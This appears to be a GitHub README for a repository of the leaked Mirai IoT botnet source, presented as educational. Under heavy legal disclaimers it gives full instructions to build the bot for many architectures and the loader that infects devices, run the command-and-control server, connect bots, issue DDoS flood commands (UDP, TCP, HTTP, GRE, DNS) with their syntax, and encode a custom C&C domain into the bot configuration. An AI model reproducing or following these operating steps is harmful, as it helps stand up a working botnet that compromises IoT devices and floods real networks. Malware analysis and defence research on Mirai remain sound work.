# 🔬 Mirai Botnet Source Code - Educational Research Only

[![Educational Purpose](https://img.shields.io/badge/Purpose-Educational%20Only-red)](https://github.com/Linkatplug/Mirai-Source-Code)
[![Security Research](https://img.shields.io/badge/Use-Security%20Research-yellow)](https://github.com/Linkatplug/Mirai-Source-Code)
[![License](https://img.shields.io/badge/License-GPL-blue)](LICENSE.md)

**Historical IoT Botnet Source Code for Security Research and Education in Isolated Environments**

---

## ⚠️ CRITICAL LEGAL WARNING

**THIS SOFTWARE IS FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY**

🚨 **READ THIS CAREFULLY BEFORE PROCEEDING** 🚨

- ✅ **LEGAL USE**: Security research, penetration testing training, malware analysis, and network defense education in **COMPLETELY ISOLATED** lab environments with devices **YOU OWN**
- ❌ **ILLEGAL USE**: Operating botnets, attacking systems without authorization, unauthorized access to computers, disrupting services, or any malicious activity
- ⚖️ **LEGAL CONSEQUENCES**: Unauthorized use may result in criminal prosecution, imprisonment, and significant fines under laws including the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide
- 🔒 **YOUR RESPONSIBILITY**: By using this code, you accept full legal responsibility for your actions

**IF YOU DON'T UNDERSTAND THESE WARNINGS, DO NOT PROCEED**

---

## 📖 Table of Contents

- [What is Mirai?](#what-is-mirai)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
  - [Quick Start with Docker (Recommended)](#quick-start-with-docker-recommended)
  - [Manual Installation](#manual-installation)
- [Usage](#usage)
  - [Running the CNC Server](#running-the-cnc-server)
  - [Connecting Bots](#connecting-bots)
  - [Testing Attacks](#testing-attacks)
- [Architecture](#architecture)
- [Configuration](#configuration)
- [Troubleshooting](#troubleshooting)
- [Learning Resources](#learning-resources)
- [Contributing](#contributing)
- [Credits](#credits)

---

## 🎯 What is Mirai?

Mirai is a **historically significant IoT botnet** that emerged in 2016 and caused massive Distributed Denial of Service (DDoS) attacks, including:

- **Krebs on Security** - Record-breaking 620 Gbps DDoS attack
- **Dyn DNS** - Took down major websites (Twitter, Reddit, Netflix, etc.)
- **OVH** - 1.1 Tbps attack, one of the largest at the time

The source code was leaked publicly by "Anna-senpai" in September 2016 and became a reference for:

- 🔍 **IoT Security Research** - Understanding IoT vulnerabilities
- 🎓 **Cybersecurity Education** - Teaching about botnet architecture
- 🛡️ **Defense Development** - Building detection and mitigation systems
- 📊 **Malware Analysis** - Studying propagation and attack techniques

### Key Features

- **Multi-Architecture Support**: Compiles for ARM, MIPS, x86, PowerPC, SPARC, and more
- **Telnet Brute-Force**: Scans and compromises IoT devices with default credentials
- **DDoS Capabilities**: Multiple attack vectors (UDP flood, TCP SYN, HTTP flood, GRE, etc.)
- **Self-Propagation**: Automatically spreads to vulnerable devices
- **C&C Infrastructure**: Command and Control server for managing bots

---

## 📋 Prerequisites

### System Requirements

- **Operating System**: Linux (Ubuntu 20.04+ or Debian 10+ recommended)
- **Memory**: Minimum 2GB RAM
- **Disk Space**: At least 1GB free
- **Network**: Isolated network environment (virtual machines, VLANs, or air-gapped)

### Required Software

```bash
# Core dependencies
- gcc (7.0+)
- golang (1.11+)
- electric-fence
- mysql-server (5.7+ or MariaDB 10.3+)
- mysql-client
- git
- make
- build-essential

# Optional for Docker setup
- docker (20.10+)
- docker-compose (1.29+)
```

---

## 🚀 Installation

### Quick Start with Docker (Recommended)

Docker provides complete isolation and is the **safest and easiest** way to test Mirai.

#### 1. Install Docker

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y docker.io docker-compose

# Start Docker
sudo systemctl start docker
sudo systemctl enable docker

# Add your user to docker group (logout/login after this)
sudo usermod -aG docker $USER
```

#### 2. Clone the Repository

```bash
git clone https://github.com/Linkatplug/Mirai-Source-Code.git
cd Mirai-Source-Code
```

#### 3. Start All Services

```bash
# Build and start all containers
docker-compose up -d --build

# Check status
docker-compose ps

# View logs
docker-compose logs -f cnc
```

#### 4. Connect to CNC

```bash
telnet localhost 23

# Default credentials:
# Username: admin
# Password: password123
```

#### 5. Cleanup

```bash
# Stop all services
docker-compose down

# Remove all data (complete cleanup)
docker-compose down -v
```

**✅ For detailed Docker instructions, see [DOCKER.md](DOCKER.md)**

---

### Manual Installation

For a deeper understanding of the system, you can install and run components manually.

#### 1. Install Dependencies

```bash
# Update system
sudo apt-get update

# Install required packages
sudo apt-get install -y \
    gcc \
    golang-go \
    electric-fence \
    mysql-server \
    mysql-client \
    git \
    build-essential \
    net-tools

# Verify installations
gcc --version        # Should be 7.x or higher
go version           # Should be 1.11 or higher
mysql --version      # Should be 5.7 or higher
```

#### 2. Clone Repository

```bash
git clone https://github.com/Linkatplug/Mirai-Source-Code.git
cd Mirai-Source-Code
```

#### 3. Setup MySQL Database

```bash
# Start MySQL service
sudo systemctl start mysql
sudo systemctl enable mysql

# Create database and tables
sudo mysql < scripts/db.sql

# Create admin user
sudo mysql mirai << EOF
INSERT INTO users VALUES (NULL, 'admin', 'password123', 0, 0, 0, 0, -1, 1, 30, '');
INSERT INTO users VALUES (NULL, 'testuser', 'test123', 0, 0, 0, 0, -1, 1, 30, '');
EOF

# Verify database setup
sudo mysql mirai -e "SELECT username FROM users;"
```

#### 4. Configure CNC Server

Edit the database credentials in `mirai/cnc/main.go`:

```bash
nano mirai/cnc/main.go
```

Update these constants:

```go
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = ""           // Your MySQL root password
const DatabaseTable string  = "mirai"
```

#### 5. Build Components

```bash
cd mirai

# Build in debug mode (recommended for learning)
./build.sh debug telnet

# This creates in debug/ folder:
# - cnc (Command & Control server)
# - mirai.dbg (Bot for x86 with debug output)
# - mirai.* (Cross-compiled bots for various architectures)
# - enc (Configuration encoder tool)
# - scanListen (Scan result listener)
```

#### 6. Build Loader (Optional)

```bash
cd ../loader
./build.sh

# This creates:
# - loader (Binary loader for compromised devices)
```

**✅ For step-by-step installation guide, see [QUICKSTART.md](QUICKSTART.md)**

---

## 💻 Usage

### Running the CNC Server

The Command & Control (CNC) server manages all connected bots and coordinates attacks.

```bash
cd mirai/debug

# Run CNC server (requires MySQL to be running)
./cnc

# You should see:
# Mysql DB opened
# Listening on port :23 (CNC)
# Listening on port :101 (API)
```

### Connecting to CNC

Open a new terminal and connect via telnet:

```bash
telnet localhost 23

# Login with default credentials:
# Username: admin
# Password: password123
```

### CNC Commands

Once logged in, you can use these commands:

```
?                    - Show help
bots                 - List connected bots
botcount             - Show number of connected bots
clear                - Clear screen

# Attack commands (only use on systems you own!)
udp [ip] [duration] [size] [port]          - UDP flood
tcp [ip] [duration] [size] [port] [flags]  - TCP flood
http [url] [duration]                       - HTTP flood
vse [ip] [duration]                         - Valve Source Engine flood
dns [ip] [duration]                         - DNS flood
greip [ip] [duration]                       - GRE IP flood
greeth [ip] [duration]                      - GRE Ethernet flood
```

### Connecting Bots

To test bot connectivity:

```bash
cd mirai/debug

# Run a bot (it will try to connect to CNC)
./mirai.dbg

# In your CNC telnet session, type:
bots

# You should see your bot listed!
```

### Testing Attacks (Safely)

**⚠️ ONLY TEST AGAINST SYSTEMS YOU OWN IN AN ISOLATED NETWORK**

```bash
# In CNC telnet session:

# Example: UDP flood your test server for 30 seconds
udp 192.168.1.100 30 512 80

# Monitor the attack from another terminal
sudo tcpdump -i any host 192.168.1.100
```

### Configuration Encoding

The bot uses XOR-encoded configuration strings. To encode custom values:

```bash
cd mirai/debug

# Encode a domain name
./enc string "my-cnc-server.com"

# Output will be something like:
# XOR'ing 17 bytes of data...
# \x44\x57\x41\x41\x4A\x41\x44\x43...

# Copy this to bot/table.c in the TABLE_CNC_DOMAIN entry
```

---

## 🏗️ Architecture

### Component Overview

```
┌─────────────────────────────────────────────────────────┐
│                   Mirai Botnet Architecture              │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌──────────────┐         ┌─────────────────┐          │
│  │ Infected Bot │────────▶│  CNC Server     │          │
│  │  (IoT Device)│◀────────│  (Command &     │          │
│  └──────┬───────┘         │   Control)      │          │
│         │                 └────────┬────────┘          │
│         │                          │                    │
│         │ Reports               ┌──▼──────┐            │
│         │ Vulnerable            │  MySQL  │            │
│         │ Devices               │Database │            │
│         │                       └─────────┘            │
│         │                                               │
│         ▼                                               │
│  ┌──────────────┐         ┌─────────────────┐         │
│  │   Scanner    │────────▶│     Loader      │         │
│  │  (Port 48101)│         │ (Infects New    │         │
│  └──────────────┘         │  Devices)       │         │
│                           └─────────────────┘         │
└─────────────────────────────────────────────────────────┘
```

### File Structure

```
Mirai-Source-Code/
│
├── mirai/                  # Main botnet code
│   ├── bot/                # Bot malware (C)
│   │   ├── main.c          # Entry point
│   │   ├── attack*.c       # DDoS attack implementations
│   │   ├── scanner.c       # Telnet/SSH brute-force scanner
│   │   ├── killer.c        # Kills competing malware
│   │   ├── table.c/h       # Obfuscated configuration
│   │   └── resolv.c        # DNS resolver
│   │
│   ├── cnc/                # Command & Control (Go)
│   │   ├── main.go         # CNC server
│   │   ├── admin.go        # Admin interface
│   │   ├── attack.go       # Attack coordination
│   │   ├── database.go     # MySQL interaction
│   │   └── bot.go          # Bot management
│   │
│   └── tools/              # Utility tools
│       └── scanListen.go   # Scan result listener
│
├── loader/                 # Loader for propagation (C)
│   └── src/
│       ├── main.c          # Loader entry point
│       ├── server.c        # HTTP server for binaries
│       ├── binary.c        # Binary management
│       └── telnet_info.c   # Telnet credential handling
│
├── scripts/                # Setup scripts
│   ├── db.sql              # MySQL database schema
│   └── cross-compile.sh    # Cross-compilation helper
│
├── QUICKSTART.md           # Quick start guide
├── DOCKER.md               # Docker setup guide
├── ANALYSIS.md             # Technical analysis
└── README.md               # This file
```

---

## ⚙️ Configuration

### Bot Configuration (mirai/bot/table.c)

The bot stores configuration in XOR-obfuscated strings:

```c
// Key configuration entries:
TABLE_CNC_DOMAIN     // Domain/IP of CNC server
TABLE_CNC_PORT       // CNC server port (default: 23)
TABLE_SCAN_CB_DOMAIN // Scan callback domain
TABLE_SCAN_CB_PORT   // Scan callback port (default: 48101)
```

To change configuration:

1. Use the `enc` tool to encode new values
2. Update values in `bot/table.c`
3. Rebuild the bot

### CNC Configuration (mirai/cnc/main.go)

```go
// Database settings
const DatabaseAddr string   = "127.0.0.1"    // MySQL server IP
const DatabaseUser string   = "root"          // MySQL username
const DatabasePass string   = ""              // MySQL password
const DatabaseTable string  = "mirai"         // Database name

// Server settings  
const Tel_Port string       = "23"            // Telnet port
const Api_Port string       = "101"           // API port
```

---

## 🔧 Troubleshooting

### CNC Server Won't Start

```bash
# Check if MySQL is running
sudo systemctl status mysql

# Check if port 23 is available
sudo netstat -tulpn | grep :23

# If port is in use, kill the process or change the port
sudo lsof -ti:23 | xargs kill -9

# Check MySQL connection
mysql -u root -p -e "SHOW DATABASES;"

# View CNC logs
./debug/cnc
```

### Bot Can't Connect to CNC

```bash
# Check CNC domain configuration
grep TABLE_CNC_DOMAIN mirai/bot/table.c

# Test DNS resolution
ping -c 1 cnc.changeme.com

# Test telnet connection manually
telnet localhost 23

# Verify bot is using correct IP/domain
# Consider using 127.0.0.1 or localhost for testing
```

### Build Errors

```bash
# Install missing dependencies
sudo apt-get install gcc golang electric-fence build-essential

# Check Go environment
go env

# For cross-compilation errors (expected if cross-compilers not installed)
# You can safely ignore errors for architectures you don't need

# Build only for x86 (debug mode)
cd mirai
gcc -std=c99 -DDEBUG -DMIRAI_TELNET bot/*.c -static -o debug/mirai.dbg
```

### MySQL Connection Refused

```bash
# Start MySQL service
sudo systemctl start mysql

# Reset MySQL root password if needed
sudo mysql
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_password';
FLUSH PRIVILEGES;
EXIT;

# Verify database exists
sudo mysql -e "SHOW DATABASES;"

# Recreate database
sudo mysql < scripts/db.sql
```

---

## 📚 Learning Resources

### Documentation in This Repository

- **[QUICKSTART.md](QUICKSTART.md)** - 30-minute quick start guide
- **[DOCKER.md](DOCKER.md)** - Complete Docker setup instructions
- **[ANALYSIS.md](ANALYSIS.md)** - Deep technical analysis of the code
- **[ForumPost.md](ForumPost.md)** - Original leak post with technical details

### External Resources

**Understanding Mirai:**
- [Krebs on Security: KrebsOnSecurity Hit with Record DDoS](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/)
- [Wikipedia: 2016 Dyn Cyberattack](https://en.wikipedia.org/wiki/2016_Dyn_cyberattack)
- [MalwareMustDie Analysis](http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html)

**IoT Security:**
- OWASP IoT Security Project
- NIST IoT Cybersecurity Guidelines
- IoT Security Foundation Resources

**Defense Tools:**
- Fail2ban - Brute-force protection
- Suricata/Snort - Intrusion detection
- iptables/nftables - Firewall rules
- Wireshark - Network traffic analysis

---

## 🤝 Contributing

Contributions are welcome to improve **educational** aspects of this repository:

✅ **Welcome Contributions:**
- Documentation improvements
- Bug fixes in build scripts
- Better explanations and tutorials
- Defense/detection examples
- Educational exercises

❌ **NOT Welcome:**
- Evasion techniques
- Improved attack capabilities
- Obfuscation improvements
- Anti-detection features

Please open an issue first to discuss significant changes.

---

## 🙏 Credits

- **Anna-senpai** - Original author who leaked the source code ([original post](https://hackforums.net/showthread.php?tid=5420472))
- **Security Research Community** - For analysis and documentation
- **IoT Security Researchers** - For defense improvements

---

## 📜 License

See [LICENSE.md](LICENSE.md) for details.

**This code is provided "as is" for educational and research purposes only. The authors and contributors are not responsible for any misuse or damage caused by this software.**

---

## ⚖️ Final Disclaimer

**USE AT YOUR OWN RISK - EDUCATIONAL PURPOSES ONLY**

By downloading, installing, or using this software, you agree to:

1. Use it **ONLY** for legal security research and education
2. Operate it **ONLY** in completely isolated environments
3. Test **ONLY** on systems you own or have explicit written permission to test
4. **NEVER** use it to attack, disrupt, or damage any systems
5. Accept **FULL LEGAL RESPONSIBILITY** for your actions

**Violations of computer crime laws can result in:**
- Federal criminal charges
- Years of imprisonment
- Significant fines
- Permanent criminal record
- Loss of professional certifications and career

**If you don't fully understand these warnings and the legal implications, DO NOT USE THIS SOFTWARE.**

---

<div align="center">

**🔒 For Education. For Research. For Defense. 🔒**

*"The best defense is understanding the attack"*

**Stay Legal. Stay Ethical. Stay Safe.**

</div> 
